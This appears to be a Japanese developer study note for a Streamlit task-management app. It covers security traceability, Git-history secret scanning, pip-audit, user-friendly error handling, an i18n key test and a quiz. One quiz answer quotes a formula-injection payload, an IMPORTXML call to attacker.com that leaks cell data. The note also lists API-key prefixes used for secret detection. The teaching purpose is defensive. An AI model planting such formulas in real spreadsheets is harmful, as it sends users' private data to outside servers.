## 2. 新しく出てきた概念・ツールの解説

### ① セキュリティ要件の追跡性（Traceability）
- **なぜ必要か**：「セキュリティに配慮して作りました」という口頭の説明だけでは、本当にすべての穴が塞がれているかを第三者（実行委員会や他のエンジニア）が客観的に検証できません。
- **追跡性の確保**：要件項目（S1〜S14）と、「どのファイルの何行目でどう実装されているか」「どの単体テストで保証されているか」を 1 対 1 で紐付けることで、将来コードを修正した際にもセキュリティ要件が意図せず壊れるのを防ぎます。

### ② Git 履歴全体のシークレットスキャン
- **「現在のファイル」だけでは不十分な理由**：Git は「過去のすべてのバージョンの変更履歴」を永久に保持するバージョン管理システムです。もし過去のコミットで一度でも本物の API キーや秘密鍵をコミットしてしまっていた場合、たとえ次のコミットで削除したとしても、コミット履歴（`git log`）を辿れば誰でも鍵を復元できてしまいます。
- **監査方法**：過去の全コミットの差分（`git log -p`）に対して、API キー特有のプレフィックス（`AIza...`, `xoxb-...`, `BEGIN PRIVATE KEY` 等）を検索し、過去一度も漏洩していないことを確認します。

### ③ サプライチェーンセキュリティと `pip-audit`
- **サプライチェーン攻撃とは**：自分の書いたプログラムにバグがなくても、使っているオープンソースライブラリ（Streamlit やその内部で使われる通信ライブラリなど）にセキュリティ上の欠陥（脆弱性）があると、そこを経由してアプリが乗っ取られたりデータが盗まれたりします。
- **`pip-audit` の仕組み**：PyPA（Python Packaging Authority）が管理する脆弱性データベース（PyPI advisory database / OSV）と、プロジェクトにインストールされている全ライブラリのバージョンを照合し、既知の脆弱性（CVE / GHSA）が含まれていないかを自動診断します。

### ④ エラーハンドリングの UX 原則（6.3）
- **Bad UX**: `ValueError: invalid literal for int() with base 10: 'abc'` や `OptimisticLockError: Task t001 updated_at mismatch`
  - 専門知識のない一般の実行委員が見ると「アプリが壊れた」「自分が何か重大なミスをしたのではないか」と不安になります。
- **Good UX**: 「他のメンバーによって先に更新されました。画面を再読み込み（リロード）して最新の情報を確認してから再度お試しください。」
  - 専門用語を使わず、**「何が起きたのか」** と **「次にユーザーが何をすれば解決するのか（Actionable Guidance）」** を明確に伝えます。

## 3. 重要コードのウォークスルー

### ① Git 履歴全体を検索する監査コマンド

```bash
# 全コミットの差分（-p）から、Google API キーのプレフィックス "AIza" を検索
git log -p | grep "AIza"
```
- **`git log -p`**：各コミットで追加・削除されたコードの差分（patch）を全履歴にわたって出力します。
- **`grep "AIza"`**：差分の中から指定した文字列パターンのみを抽出します。
- 出力結果に本物のキーが含まれておらず、`.streamlit/secrets.toml.example` 内の見本ダミー文字列（`AIzaSy-your-gemini-api-key`）のみが表示されれば合格です。

### ② 技術的例外から案内メッセージへの置換（`pages/inbox.py`）

```python
try:
    updated_t, log = accept_assignment(
        task=task,
        actor_member_id=current_member.member_id,
        now=now,
    )
    repo.update_task(updated_t, expected_updated_at=task.updated_at)
    repo.add_activity_log(log)
    st.toast(t("inbox.accepted_toast", lang))
    st.rerun()
except OptimisticLockError:
    st.error(t("common.lock_error", lang))
except InvalidAssignmentTransitionError:
    st.error(t("common.invalid_transition_error", lang))
except Exception:
    st.error(t("common.general_error", lang))
```
- **10〜15行目**：例外が発生した場合に `st.error(str(e))` で Python のエラー文をそのまま出すのを廃止しました。
- `OptimisticLockError` には「画面を再読み込みして最新の情報を確認してから再度お試しください」、`InvalidAssignmentTransitionError` には「すでに別の状態に更新されているか、操作できません」、予期せぬエラーには「入力内容をご確認のうえ、再度お試しください」と、ユーザーが次に行うべき操作を日英バイリンガルで案内します。

### ③ ja.toml と en.toml のキー対称性テスト（`tests/test_phase2a.py`）

```python
def test_i18n_keys_match_between_ja_and_en() -> None:
    ja = load_locale("ja")
    en = load_locale("en")
    assert set(ja.keys()) == set(en.keys())
    for sec in ja:
        assert set(ja[sec].keys()) == set(en[sec].keys()), f"Mismatch in [{sec}]"
```
- **3〜5行目**：日本語（`ja.toml`）と英語（`en.toml`）の辞書ファイルを読み込み、すべてのセクション名、および各セクション内のすべてのキーが 1 対 1 で完全に一致しているかを集合演算（`set(...) == set(...)`）で検証します。
- これにより、「日本語だけキーを追加して英語側を忘れてしまい、英語 UI で画面がクラッシュする」というバグを CI（自動テスト）で 100% 防ぐことができます。

## 4. 理解度チェック

### Q1. もし開発中に誤って本物の Slack Bot トークンを Git にコミットしてしまった場合、`git rm` して新しいコミットを作れば安全でしょうか？

<details>
<summary>解答と解説</summary>

**不正解（安全ではありません）**

新しいコミットでファイルを削除しても、Git の過去のコミット履歴（`git log`）の中にトークンが文字列として永久に残っています。リポジトリを閲覧できる人（または GitHub に push された場合は GitHub のキャッシュやクローラー）からトークンを読み取られてしまう危険があります。
**正しい対応**:
1. 直ちに Slack の管理画面（Slack API: Your Apps）でそのトークンを **Revoke（失効）** させます（これを行わない限り、Git から消しても漏洩したトークンは使えてしまいます）。
2. その後、`git-filter-repo` や BFG Repo-Cleaner 等のツールを使って Git の履歴そのものを書き換えて該当ファイルを履歴から完全に抹消します。
</details>

### Q2. スプレッドシートへの書き込みで `value_input_option="RAW"` を指定するセキュリティ上の理由はなぜでしょうか？

<details>
<summary>解答と解説</summary>

**数式インジェクション（Formula Injection / CSV Injection）を防ぐため**

もし `USER_ENTERED` を指定していると、ユーザー入力や AI 出力の先頭に `=`、`+`、`-`、`@` などの文字があった場合、Google スプレッドシートがそれを「計算式」として自動解釈・実行してしまいます。
例えば `=IMPORTXML("https://attacker.com/?leak="&A1, "/*")` のような悪意ある数式が入力された場合、シート内の他のメンバーの個人情報や機密データが外部サーバーに送信されてしまう恐れがあります。`RAW` を指定することで、すべての入力を無害な「ただのプレーンテキスト文字列」として確実に保存できます。
</details>

### Q3. Streamlit アプリでエラーが発生した際、`st.error(str(e))` を画面に表示するのが望ましくない理由を UX とセキュリティの両面から答えてください。

<details>
<summary>解答と解説</summary>

- **UX 面**: `KeyError: 'task_id'` やスタックトレースなどの技術的メッセージは専門知識のないユーザーには意味が分からず、「アプリが壊れた」「何をしていいか分からない」という混乱や不安を与えます。
- **セキュリティ面**: エラーメッセージの中にデータベースの内部カラム名、ファイルパス、SQL クエリ、内部 IP アドレス、あるいは外部 API の詳細なレスポンスが含まれていることがあり、攻撃者にシステムの内部構造（情報漏洩）を教えてしまうリスクがあります。
そのため、画面には「画面を再読み込みしてください」「入力内容をご確認ください」といったユーザー向けの安全な案内を表示し、詳細な技術的ログはサーバー側（ログ出力）にのみ記録するのがベストプラクティスです。
</details>
